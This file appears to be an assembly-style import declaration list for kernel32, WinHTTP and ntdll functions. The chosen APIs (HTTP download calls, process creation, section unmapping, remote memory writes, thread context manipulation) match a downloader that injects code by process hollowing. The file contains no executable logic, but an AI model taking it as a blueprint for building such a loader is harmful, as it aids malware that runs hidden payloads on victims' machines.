createFunc kernel32, ExitProcess
createFunc kernel32, GetSystemWindowsDirectoryW
createFunc kernel32, CreateProcessW
createFunc kernel32, TerminateProcess
createFunc kernel32, GetSystemWow64DirectoryW

HMOD kernel32, <KERNEL32.dll>

createFunc WINHTTP, WinHttpOpenRequest
createFunc WINHTTP, WinHttpReceiveResponse
createFunc WINHTTP, WinHttpOpen
createFunc WINHTTP, WinHttpSendRequest
createFunc WINHTTP, WinHttpQueryHeaders
createFunc WINHTTP, WinHttpReadData
createFunc WINHTTP, WinHttpCloseHandle
createFunc WINHTTP, WinHttpConnect

HMOD WINHTTP, <WINHTTP.dll>

createFunc ntdllp, ZwUnmapViewOfSection
createFunc ntdllp, RtlInitUnicodeString
createFunc ntdllp, NtOpenFile
createFunc ntdllp, NtClose
createFunc ntdllp, NtCreateSection
createFunc ntdllp, memcpy
createFunc ntdllp, wcstoul
createFunc ntdllp, ZwResumeThread
createFunc ntdllp, ZwWriteVirtualMemory
createFunc ntdllp, NtQueryInformationProcess
createFunc ntdllp, ZwMapViewOfSection
createFunc ntdllp, ZwSetContextThread
createFunc ntdllp, ZwGetContextThread
createFunc ntdllp, ZwSetInformationThread
createFunc ntdllp, ZwQueryInformationThread
createFunc ntdllp, ZwProtectVirtualMemory
createFunc ntdllp, LdrProcessRelocationBlock
createFunc ntdllp, RtlImageDirectoryEntryToData
createFunc ntdllp, RtlImageNtHeader
createFunc ntdllp, RtlImageNtHeaderEx
createFunc ntdllp, NtQueryDirectoryFile
createFunc ntdllp, LdrLoadDll
createFunc ntdllp, LdrGetProcedureAddress
createFunc ntdllp, RtlAllocateHeap
createFunc ntdllp, RtlFreeHeap
createFunc ntdllp, memset

HMOD ntdllp, <>

